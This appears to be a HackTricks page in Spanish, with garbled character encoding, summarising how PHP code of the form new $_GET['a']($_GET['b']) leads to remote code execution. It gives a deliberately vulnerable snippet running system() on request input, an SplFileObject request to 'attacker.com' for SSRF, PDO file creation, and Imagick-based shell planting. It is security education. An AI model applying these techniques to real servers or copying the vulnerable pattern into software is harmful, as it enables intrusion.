# PHP - RCE abusando de la creaci贸n de objetos: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

Esto es b谩sicamente un resumen de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introducci贸n

La creaci贸n de nuevos objetos arbitrarios, como `new $_GET["a"]($_GET["a"])`, puede llevar a la Ejecuci贸n Remota de C贸digo (RCE), como se detalla en un [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Este documento destaca varias estrategias para lograr RCE.

## RCE a trav茅s de Clases Personalizadas o Carga Autom谩tica

La sintaxis `new $a($b)` se utiliza para instanciar un objeto donde **`$a`** representa el nombre de la clase y **`$b`** es el primer argumento pasado al constructor. Estas variables pueden provenir de entradas de usuario como GET/POST, donde pueden ser cadenas o arreglos, o de JSON, donde podr铆an presentarse como otros tipos.

Considera el fragmento de c贸digo a continuaci贸n:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
En este caso, establecer `$a` como `App` o `App2` y `$b` como un comando del sistema (por ejemplo, `uname -a`) resulta en la ejecuci贸n de ese comando.

Las **funciones de carga autom谩tica** pueden ser explotadas si no hay clases directamente accesibles. Estas funciones cargan autom谩ticamente clases desde archivos cuando son necesarias y se definen usando `spl_autoload_register` o `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
El comportamiento de la carga autom谩tica var铆a con las versiones de PHP, ofreciendo diferentes posibilidades de RCE.

## RCE a trav茅s de Clases Integradas

La falta de clases personalizadas o autoloaders puede ser suficiente para RCE utilizando **clases integradas de PHP**. El n煤mero de estas clases var铆a entre 100 y 200, seg煤n la versi贸n de PHP y las extensiones. Se pueden listar utilizando `get_declared_classes()`.

Los constructores de inter茅s pueden ser identificados a trav茅s de la API de reflexi贸n, como se muestra en el siguiente ejemplo y en el enlace [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE a trav茅s de m茅todos espec铆ficos incluye:**

### **SSRF + Deserializaci贸n de Phar**

La clase `SplFileObject` permite SSRF a trav茅s de su constructor, permitiendo conexiones a cualquier URL:
```php
new SplFileObject('http://attacker.com/');
```
### **Explotando PDOs**

La clase constructora de PDO permite conexiones a bases de datos a trav茅s de cadenas DSN, lo que potencialmente permite la creaci贸n de archivos u otras interacciones:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Versiones de PHP hasta la 5.3.22 y 5.4.12 eran susceptibles a ataques XXE a trav茅s de los constructores `SoapClient` y `SimpleXMLElement`, dependiendo de la versi贸n de libxml2.

## RCE a trav茅s de la Extensi贸n Imagick

En el an谩lisis de las **dependencias de un proyecto**, se descubri贸 que **Imagick** podr铆a ser aprovechado para la **ejecuci贸n de comandos** mediante la creaci贸n de nuevos objetos. Esto presenta una oportunidad para explotar vulnerabilidades.

### Analizador VID

Se identific贸 la capacidad del analizador VID para escribir contenido en cualquier ruta especificada en el sistema de archivos. Esto podr铆a llevar a la colocaci贸n de una shell de PHP en un directorio accesible a trav茅s de la web, logrando la Ejecuci贸n Remota de C贸digo (RCE).

#### Analizador VID + Carga de Archivos

Se observa que PHP almacena temporalmente los archivos cargados en `/tmp/phpXXXXXX`. El analizador VID en Imagick, utilizando el protocolo **msl**, puede manejar comodines en las rutas de archivos, facilitando la transferencia del archivo temporal a una ubicaci贸n elegida. Este m茅todo ofrece un enfoque adicional para lograr la escritura de archivos arbitraria dentro del sistema de archivos.

### PHP Crash + Fuerza Bruta

Un m茅todo descrito en el [**informe original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) implica cargar archivos que provoquen un fallo en el servidor antes de la eliminaci贸n. Al hacer fuerza bruta en el nombre del archivo temporal, se vuelve posible para Imagick ejecutar c贸digo PHP arbitrario. Sin embargo, esta t茅cnica se encontr贸 efectiva solo en una versi贸n desactualizada de ImageMagick.

## Referencias

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
